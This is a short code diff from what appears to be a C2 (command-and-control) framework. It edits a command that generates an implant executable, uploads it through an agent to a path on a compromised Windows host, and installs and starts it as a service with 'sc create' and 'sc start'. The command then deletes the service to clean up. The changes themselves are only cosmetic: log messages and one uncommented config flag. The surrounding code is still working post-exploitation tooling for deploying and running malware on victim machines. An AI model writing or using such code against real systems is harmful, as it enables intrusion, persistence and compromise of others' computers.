@@ -77,7 +77,7 @@ namespace Common.Command.Custom
 
             var payloadOptions = new ImplantConfig()
             {
-                //StoreImplant = false,
+                StoreImplant = false,
                 Architecture =  agent.Metadata.Architecture == "x86" ? ImplantArchitecture.x86 : ImplantArchitecture.x64,
                 Endpoint = endpoint,
                 IsDebug = false,
@@ -99,23 +99,24 @@ namespace Common.Command.Custom
             else
                 commander.WriteSuccess($"[+] Generation succeed!");
 
-            commander.WriteLine($"Preparing to upload the file...");
+            commander.WriteLine($"[>] Preparing to upload the file...");
 
             var fileName = string.IsNullOrEmpty(options.file) ? implant.Config.ImplantName + ".exe" : options.file;
             if (Path.GetExtension(fileName).ToLower() != ".exe")
                 fileName += ".exe";
 
             string path = options.path + (options.path.EndsWith('\\') ? String.Empty : '\\') + fileName;
-
-            agent.Echo($"Downloading file {fileName} to {path}");
+            agent.Echo($"Uploading file {fileName} to {path}");
             agent.Upload(Convert.FromBase64String(implant.Data), path);
             agent.Delay(1);
+            commander.WriteInfo($"[>] Preparing Service...");
             agent.Echo($"Creating service");
             agent.Shell($"sc create {options.service} binPath= \"{path}\"");
             agent.Echo($"Starting service");
             agent.Shell($"sc start {options.service}");
 
             agent.Delay(20);
+            commander.WriteInfo($"[>] Preparing Cleaning...");
             if (!options.inject)
             {
                 agent.Echo($"Removing service");
